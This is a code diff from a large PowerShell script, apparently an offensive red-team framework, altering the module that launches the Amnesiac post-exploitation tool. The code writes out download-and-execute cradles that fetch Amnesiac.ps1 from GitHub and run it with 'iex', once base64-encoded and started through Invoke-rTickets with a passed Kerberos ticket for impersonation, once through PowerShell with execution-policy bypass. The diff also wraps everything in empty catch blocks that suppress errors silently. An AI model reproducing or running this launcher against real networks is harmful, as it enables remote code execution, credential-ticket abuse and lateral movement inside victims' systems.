@@ -1572,41 +1572,53 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
     ################################################################################################################
 
     if ($Module -eq "Amnesiac") {
+    try {
         if ([string]::IsNullOrEmpty($Global:AmnesiacPID) -or (Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -eq $null) {
             $Global:PN = $null
             $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join ''
-        
+
             if (!$Global:SID) {
-                $Global:SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+                try {
+                    $Global:SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+                } catch {}
             }
-        
+
             $finalcommand = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac -ScanMode -GlobalPipeName $PN"
-            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))
+            try {
+                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))
+            } catch {}
 
             if (!$CurrentUser) {
-                Write-Log -Message  "Starting Amnesiac with impersonation"
-                GetCurrentUserTicket
-                $process = Invoke-rTickets startonlynet /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /username:$env:Username /password:Fakepass /domain:$Domain /show /ptt /ticket:$Global:OriginalUserTicket
-                Write-Log $Process
-                Write-Log ""
-                $pattern = "\sProcessID\s+:\s+(\d+)"
-            
-                # Find the created process ID
-                $match = [regex]::Match($process, $pattern)
-                if ($match.Success) {
-                    $Global:AmnesiacPID = $match.Groups[1].Value
-                } 
+                Write-Log -Message "Starting Amnesiac with impersonation"
+                try { GetCurrentUserTicket } catch {}
+
+                try {
+                    $process = Invoke-rTickets startonlynet /program:"c:\windows\system32\cmd.exe /c powershell.exe -noexit -NoProfile -EncodedCommand $encodedCommand" /username:$env:Username /password:Fakepass /domain:$Domain /show /ptt /ticket:$Global:OriginalUserTicket
+                    Write-Log $process
+                    Write-Log ""
+
+                    $pattern = "\sProcessID\s+:\s+(\d+)"
+                    $match = [regex]::Match($process, $pattern)
+                    if ($match.Success) {
+                        $Global:AmnesiacPID = $match.Groups[1].Value
+                    }
+                } catch {}
             }
-        
+
             if ($CurrentUser) {
-                Write-Log -Message  "Starting Amnesiac without impersonation"
-                $process = Start-Process cmd.exe -ArgumentList "/c powershell.exe -ep bypass -c `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac -ScanMode -GlobalPipeName $PN`"" -PassThru
-                $Global:AmnesiacPID = $process.Id
+                Write-Log -Message "Starting Amnesiac without impersonation"
+                try {
+                    $process = Start-Process cmd.exe -ArgumentList "/c powershell.exe -ep bypass -c `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac -ScanMode -GlobalPipeName $PN`"" -PassThru -ErrorAction SilentlyContinue
+                    $Global:AmnesiacPID = $process.Id
+                } catch {}
             }
         }
         else {
-            Write-Log -Message  "Amnesiac is already running"
-            if ($Scramble) { $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join '' }
+            Write-Log -Message "Amnesiac is already running"
+
+            if ($Scramble) {
+                $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) -join ''
+            }
             elseif ((Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -ne $null) {
                 $Global:PN = $Global:PN
             }
@@ -1614,7 +1626,13 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                 $Global:AmnesiacPID = $null
             }
         }
+    } catch {
+        # Suppress any unhandled exceptions silently
     }
+}
+
+    
+    
 
     ################################################################################################################
     ######################################### Console Display variables ############################################
